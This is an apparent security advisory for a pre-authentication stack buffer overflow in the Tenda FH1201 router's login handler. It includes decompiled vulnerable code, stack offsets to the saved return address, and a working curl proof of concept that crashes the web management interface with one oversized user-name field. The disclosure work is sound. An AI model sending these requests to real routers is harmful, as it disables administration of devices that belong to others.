# CVE-TBD: Pre-authentication stack buffer overflow in `authSecurityHandler` (Tenda FH1201)

## Summary

The Tenda FH1201 authentication handler copies the `mitUSERNAME` form field into a fixed-size stack
buffer with `strcpy()` **before** any credential check. A single unauthenticated `POST /login/Auth`
carrying a long user name corrupts the stack and stops the web server. Unlike the other findings in
this repository, this one needs **no authentication bypass, no password and no prior request**.

## Affected Product

- Vendor: Tenda · Product: FH1201 · Firmware: **V1.2.0.19(946)** (latest, 2026-07-13)

- Status: the vendor lists FH1201 V1.0 as end-of-life (discontinued 2015) yet published
  firmware V1.2.0.19(946) on 2026-07-13 as a security update for CVE-2026-11405

## Vulnerability Details

- Type: Stack-based Buffer Overflow (**CWE-121**)
- Component: `bin/httpd` → `authSecurityHandler()` at `0x004a072c` (runs for every request)
- Root cause:

```c
pcVar6 = websGetVar(wp, "mitUSERNAME", "");
uVar7  = websGetVar(wp, "mitPASSWORD", "");
uVar8  = websGetVar(wp, "usertype", "admin");
SetValue("sys.usertype", uVar8);                 /* also before authentication */
if (*pcVar6 == '\0') memcpy(auStack_2dc, "admin", 6);
else                 strcpy(auStack_2dc, pcVar6); /* <-- no length check */
if (strcmp(auStack_2dc, g_User) || strcmp(uVar7, g_Pass)) {
    websRedirect(wp, "login.asp?0");
    return 0;
}
```
The copy happens **before** the credential comparison, so the overflow does not depend on knowing
any password.

Frame layout (objdump):

```asm
004a0738  addiu sp, sp, -808
004a073c  sw    ra, 804(sp)          ; saved ra = fp+804
004a1d28  lw    s8, 800(sp)          ; saved s8 = fp+800
; auStack_2dc = fp-0x2dc = fp-732  →  distance to saved ra = 804 + 732 = 1536 bytes
```

## Proof of Concept (non-destructive: the device is restarted, nothing is persisted)

```bash
# control: ordinary login attempt
curl -i -X POST --data-urlencode 'mitUSERNAME=admin' --data-urlencode 'mitPASSWORD=x' \
     --data-urlencode 'usertype=admin' http://<router>/login/Auth
#   HTTP/1.1 302 (login rejected, server healthy)

# attack: 2000-byte user name, no credentials
python3 -c "open('/tmp/u.bin','wb').write(b'U'*2000)"
curl -i -X POST --data-urlencode 'mitUSERNAME@/tmp/u.bin' \
     --data-urlencode 'mitPASSWORD=x' --data-urlencode 'usertype=admin' \
     http://<router>/login/Auth
#   connection reset; the web server no longer answers (management interface down)
```

Measured in the rehosted firmware: control → `302` and the server keeps serving; attack → the
process enters the `Bad_Sig_entry` signal loop and stops serving.

A second experiment aligned a 1539-byte payload with the saved return address (three trailing bytes,
NUL supplied by `strcpy`). Both `ra = 0x00414141` and `ra = 0x004a4060` produce the same crash,
which shows the process dies **before** the epilogue — intermediate live locals are overwritten
first. Therefore this advisory claims denial of service only, not return-address control.

## Impact

- Unauthenticated denial of service of the entire management interface (and of the web UI) with a
  single request; the device keeps routing traffic but cannot be administered until it is rebooted.
- Because the sink sits in the authentication handler, it is reached by **every** deployment,
  independently of which business handlers are enabled.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5**
Rationale: verified, unauthenticated, single-request denial of service; no confidentiality or
integrity effect was demonstrated.

## Discovery

Discovered by Zimo-666 on 2026-10-17 via rehosting, static analysis of `authSecurityHandler` and
length-controlled requests. Vendor notified: pending.
